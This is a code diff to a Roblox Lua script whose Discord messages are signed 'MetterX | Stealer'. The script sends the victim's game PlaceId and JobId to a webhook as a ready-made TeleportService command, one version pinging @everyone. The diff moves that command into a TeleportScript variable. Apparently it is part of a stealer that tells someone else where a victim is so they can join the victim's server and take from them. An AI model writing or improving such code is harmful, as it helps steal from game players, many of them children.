@@ -51,6 +51,7 @@ local PlaceIdValue = game.PlaceId or "Unknown"
 local PlaceVersionValue = game.PlaceVersion or "Unknown"
 local PlatformValue = "Unknown"
 local VersionValue = "v1.0 Dev" -- [Release / Patch / Beta / Dev]
+local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. [[, "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
 
 if game:GetService("UserInputService").TouchEnabled and not game:GetService("UserInputService").KeyboardEnabled and not game:GetService("UserInputService").MouseEnabled then
     PlatformValue = "Mobile"
@@ -66,7 +67,7 @@ function SendMessageEMBED(url, embed, bool)
     local data = {
         username = "MetterX | Stealer",
         avatar_url = "https://cdn.discordapp.com/attachments/1292386513363144726/1295553746130174012/Photoroom-20240808_210138.png?ex=67203573&is=671ee3f3&hm=7d3bd0a97d3ef925f50a86ab0a37ca5388c74425a80d0970ab70039e46b9d860&",
-        ["content"] = "game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')",
+        ["content"] = " " .. TeleportScript .. " ",
         ["embeds"] = {
             {
                 ["title"] = embed.title,
@@ -78,7 +79,7 @@ function SendMessageEMBED(url, embed, bool)
     local data2 = {
         username = "MetterX | Stealer", 
         avatar_url = "https://cdn.discordapp.com/attachments/1292386513363144726/1295553746130174012/Photoroom-20240808_210138.png?ex=67203573&is=671ee3f3&hm=7d3bd0a97d3ef925f50a86ab0a37ca5388c74425a80d0970ab70039e46b9d860&", 
-        ["content"] = "--@everyone\ngame:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')",
+        ["content"] = "--@everyone\n " .. TeleportScript .. " ",
         ["embeds"] = {
             {
                 ["title"] = embed.title,
